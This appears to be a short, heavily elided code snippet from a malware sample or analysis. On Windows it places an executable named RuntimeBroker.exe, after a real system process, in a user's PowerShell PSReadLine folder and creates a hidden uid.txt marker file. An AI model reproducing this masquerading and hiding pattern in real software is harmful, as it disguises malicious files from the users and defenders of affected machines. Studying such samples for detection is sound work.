...
try {
    ...
    if os_type == "Windows":
        ...
        file_path = f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Powershell\\PSReadLine\\RuntimeBroker.exe"
        ...
        create_hidden_file(
            f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Powershell\\PSReadLine\\uid.txt"
        )
